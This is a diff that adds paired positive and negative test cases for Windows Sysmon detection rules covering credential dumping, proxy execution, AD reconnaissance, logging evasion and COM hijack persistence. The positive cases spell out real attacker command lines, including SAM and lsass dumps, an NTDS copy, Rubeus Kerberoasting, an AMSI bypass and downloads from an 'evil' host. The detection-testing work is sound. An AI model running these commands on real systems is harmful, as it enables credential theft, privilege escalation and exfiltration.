@@ -1129,6 +1129,248 @@ CASES = [
             EventType="SetValue",
         ),
     ),
+    # --- SYS-108 through SYS-123: a second gap-coverage pass, targeting
+    # credential-hive access, additional injection/proxy-execution LOLBAS,
+    # AD reconnaissance and Kerberoasting tooling, logging-evasion tricks,
+    # and a persistence mechanism (COM hijack) the corpus had no rule for. ---
+    (
+        "SYS-108",
+        True,
+        event(
+            1,
+            image=r"C:\Windows\System32\reg.exe",
+            command_line=r"reg.exe save HKLM\SAM C:\Temp\sam.hive",
+        ),
+    ),
+    (
+        "SYS-108",
+        False,
+        event(
+            1,
+            image=r"C:\Windows\System32\reg.exe",
+            command_line=r"reg.exe query HKLM\Software",
+        ),
+    ),
+    (
+        "SYS-109",
+        True,
+        event(
+            1,
+            image=r"C:\Users\bob\Downloads\procdump64.exe",
+            command_line=r"procdump64.exe -ma lsass.exe C:\temp\out.dmp",
+        ),
+    ),
+    (
+        "SYS-109",
+        False,
+        event(
+            1,
+            image=r"C:\Users\bob\Downloads\procdump64.exe",
+            command_line=r"procdump64.exe -ma notepad.exe out.dmp",
+        ),
+    ),
+    (
+        "SYS-110",
+        True,
+        event(
+            1,
+            image=r"C:\Windows\System32\ntdsutil.exe",
+            command_line=r'ntdsutil "ac i ntds" "ifm" "create full c:\temp\ntds" q q',
+        ),
+    ),
+    (
+        "SYS-110",
+        False,
+        event(1, image=r"C:\Windows\System32\ntdsutil.exe", command_line="ntdsutil ?"),
+    ),
+    (
+        "SYS-111",
+        True,
+        event(
+            1,
+            image=r"C:\Windows\System32\mavinject.exe",
+            command_line=r"mavinject.exe 4212 /INJECTRUNNING C:\evil.dll",
+        ),
+    ),
+    (
+        "SYS-111",
+        False,
+        event(1, image=r"C:\Windows\System32\mavinject.exe", command_line="mavinject.exe /HELP"),
+    ),
+    (
+        "SYS-112",
+        True,
+        event(
+            1,
+            image=r"C:\Windows\System32\wsl.exe",
+            command_line='wsl.exe -e /bin/bash -c "curl http://evil"',
+        ),
+    ),
+    (
+        "SYS-112",
+        False,
+        event(1, image=r"C:\Windows\System32\wsl.exe", command_line="wsl.exe --list --verbose"),
+    ),
+    (
+        "SYS-113",
+        True,
+        event(
+            1,
+            image=r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe",
+            command_line=r"MSBuild.exe C:\Users\bob\AppData\Local\Temp\evil.csproj",
+        ),
+    ),
+    (
+        "SYS-113",
+        False,
+        event(
+            1,
+            image=r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe",
+            command_line=r"MSBuild.exe C:\Repos\MyApp\MyApp.csproj",
+        ),
+    ),
+    (
+        "SYS-114",
+        True,
+        event(
+            1,
+            image=r"C:\Windows\System32\forfiles.exe",
+            command_line=r"forfiles.exe /p C:\Users\bob\AppData\Local\Temp /c calc.exe",
+        ),
+    ),
+    (
+        "SYS-114",
+        False,
+        event(
+            1,
+            image=r"C:\Windows\System32\forfiles.exe",
+            command_line=r"forfiles.exe /p C:\Logs /s /m *.log /c cmd /c del @file",
+        ),
+    ),
+    (
+        "SYS-115",
+        True,
+        event(1, image=r"C:\Windows\System32\tscon.exe", command_line="tscon.exe 3 /dest:rdp-tcp#1"),
+    ),
+    (
+        "SYS-115",
+        False,
+        event(1, image=r"C:\Windows\System32\tscon.exe", command_line="tscon.exe /query"),
+    ),
+    (
+        "SYS-116",
+        True,
+        event(1, image=r"C:\Users\bob\Downloads\SharpHound.exe", command_line="SharpHound.exe -c All"),
+    ),
+    (
+        "SYS-116",
+        False,
+        event(1, image=r"C:\Windows\System32\notepad.exe", command_line="notepad.exe"),
+    ),
+    (
+        "SYS-117",
+        True,
+        event(
+            1,
+            image=r"C:\Users\bob\Downloads\rclone.exe",
+            command_line=r"rclone.exe copy C:\Data remote:backup",
+        ),
+    ),
+    (
+        "SYS-117",
+        False,
+        event(1, image=r"C:\Windows\System32\notepad.exe", command_line="notepad.exe"),
+    ),
+    (
+        "SYS-118",
+        True,
+        event(1, image=r"C:\Users\bob\Rubeus.exe", command_line="Rubeus.exe kerberoast /outfile:hashes.txt"),
+    ),
+    (
+        "SYS-118",
+        False,
+        event(1, image=r"C:\Windows\System32\notepad.exe", command_line="notepad.exe"),
+    ),
+    (
+        "SYS-119",
+        True,
+        event(
+            1,
+            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+            command_line="powershell -version 2 -nop -c whoami",
+        ),
+    ),
+    (
+        "SYS-119",
+        False,
+        event(
+            1,
+            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+            command_line="powershell -nop -c whoami",
+        ),
+    ),
+    (
+        "SYS-120",
+        True,
+        event(
+            1,
+            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+            command_line="powershell -c [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')",
+        ),
+    ),
+    (
+        "SYS-120",
+        False,
+        event(
+            1,
+            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+            command_line="powershell -c Get-Process",
+        ),
+    ),
+    (
+        "SYS-121",
+        True,
+        event(
+            1,
+            image=r"C:\Windows\System32\bitsadmin.exe",
+            command_line=r"bitsadmin.exe /transfer job http://evil/x.exe C:\temp\x.exe",
+        ),
+    ),
+    (
+        "SYS-121",
+        False,
+        event(1, image=r"C:\Windows\System32\bitsadmin.exe", command_line="bitsadmin.exe /list"),
+    ),
+    (
+        "SYS-122",
+        True,
+        event(
+            13,
+            TargetObject=r"HKU\S-1-5-21-1-2-3-1001\Software\Classes\CLSID\{42aedc87-2188-41fd-b9a3-0c966feabec1}\InprocServer32\(Default)",
+            Details=r"C:\Users\bob\evil.dll",
+            EventType="SetValue",
+        ),
+    ),
+    (
+        "SYS-122",
+        False,
+        event(
+            13,
+            TargetObject=r"HKU\S-1-5-21-1-2-3-1001\Software\Classes\CLSID\{42aedc87-2188-41fd-b9a3-0c966feabec1}\LocalServer32",
+            Details=r"C:\Program Files\App\app.exe",
+            EventType="SetValue",
+        ),
+    ),
+    (
+        "SYS-123",
+        True,
+        event(1, image=r"C:\Users\bob\JuicyPotato.exe", command_line="JuicyPotato.exe -l 1337 -p cmd.exe"),
+    ),
+    (
+        "SYS-123",
+        False,
+        event(1, image=r"C:\Windows\System32\notepad.exe", command_line="notepad.exe"),
+    ),
 ]
 
 
